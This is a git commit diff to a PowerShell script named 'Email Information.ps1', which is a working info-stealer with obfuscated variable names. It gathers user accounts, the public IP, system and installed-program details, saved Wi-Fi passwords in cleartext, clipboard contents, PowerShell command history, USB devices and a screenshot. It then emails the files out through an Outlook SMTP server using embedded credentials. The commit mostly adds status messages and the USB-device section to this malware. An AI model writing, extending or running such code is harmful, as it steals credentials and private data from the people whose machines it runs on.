57216f5cbbcc42ffee27dacf91869dabf8a4b3b1
Mundisamug <58518526+Mundisamug@users.noreply.github.com>
2023-04-30 15:44:22 +0000

    Update Email Information.ps1

--- Email Information.ps1
+++ Email Information.ps1
@@ -28,9 +28,11 @@ $pijkhgh = "PASSWORD_HERE"
 
 #--------------------------------- User info Check ---------------------------------------
 
+
+Write-Output "Gathering User Information.."
+
 $userString = "Username: $($userInfo.Name)"
 $userString += "`nFull Name: $($userInfo.FullName)`n"
-
 $userString+="Public Ip Address = "
 $userString+=((I`wr ifconfig.me/ip).Content.Trim() | Out-String)
 $userString+="`n"
@@ -38,13 +40,13 @@ $userString+="All User Accounts: `n"
 $userString+= Get-WmiObject -Class Win32_UserAccount
 
 #--------------------------------- System info Check ---------------------------------------
+Write-Output "Gathering System Information.."
 
 $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
 $biosInfo = Get-WmiObject -Class Win32_BIOS
 $processorInfo = Get-WmiObject -Class Win32_Processor
 $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
 $userInfo = Get-WmiObject -Class Win32_UserAccount
-
 $systemString = "Operating System: $($systemInfo.Caption) $($systemInfo.OSArchitecture)"
 $systemString += "`nBIOS Version: $($biosInfo.SMBIOSBIOSVersion)"
 $systemString += "`nProcessor: $($processorInfo.Name)"
@@ -52,9 +54,9 @@ $systemString += "`nMemory: $($systemInfo.TotalVisibleMemorySize) MB"
 $systemString += "`nComputer Name: $($computerSystemInfo.Name)"
 
 #--------------------------------- Installed Programs Check ---------------------------------------
+Write-Output "Gathering Installed Programs Information.."
 
 $installedPrograms = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version
-
 $programsString = "Installed Programs:`n"
 foreach ($program in $installedPrograms) {
     $programsString += "  $($program.Name) $($program.Version)`n"
@@ -62,14 +64,14 @@ foreach ($program in $installedPrograms) {
 
 #--------------------------------- SSID + Password Check ---------------------------------------
 
+Write-Output "Searching SSID info or Passes.."
+
 $a=0
 $ws=(netsh wlan show profiles) -replace ".*:\s+"
 foreach($s in $ws)
 {if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
-
 $ssid=$s.Trim()
-if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()
-}
+if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
 $pw=(netsh wlan show profiles name=$ssid key=clear)
 $pass="None"
 foreach($p in $pw){
@@ -80,11 +82,16 @@ $wifistring+="SSID: $ssid`nPassword: $pass`n"}}}$a++;}
 
 $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
+Write-Output "Extracting Powershell history.."
+
 "------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
 $userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "------------------------   CLIPBOARD INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
+"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
+"------------------------   CONNECTED DEVICES --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
+Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' } | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "------------------------   POWERSHELL HISTORY --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 Get-Content $pshist | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
@@ -102,6 +109,8 @@ Write-Output "System and user information saved to text file."
 
 #====================================================================== TAKE SCREENSHOT ==============================================================================
 
+Write-Output "Taking a Screenshot.."
+
 $Filett = "$env:temp\SC.png"
 Add-Type -AssemblyName System.Windows.Forms
 Add-type -AssemblyName System.Drawing
@@ -114,16 +123,16 @@ $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
 $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-
-Start-Sleep 3
+Start-Sleep 1
 
 #====================================================================== SEND ALL COLLECTED INFO ==============================================================================
-Write-Output "Sending info..."
 
 $vsdvvservd = "$env:temp\SC.png"
 $adawdxcaec = "$env:temp\systeminfo.txt"
 
-$vrdiugb = "$env:COMPUTERNAME : : Results"
+Write-Output "Sending System info..."
+
+$vrdiugb = "$env:COMPUTERNAME : : System Info Results"
 $bfsvvrnbn = "$env:COMPUTERNAME : Info Scraper Results... : $tfhftttt"
 $rtthtegtd = "smtp.outlook.com"
 $rgdgthyu = "587"
@@ -138,3 +147,4 @@ send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb -body $bfsvvrnb
 Else {
 send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb -body $bfsvvrnbn -Attachment $adawdxcaec -smtpServer $rtthtegtd -port $rgdgthyu -credential $gtthyuyju -usessl
 }
+Write-Output "Sent."
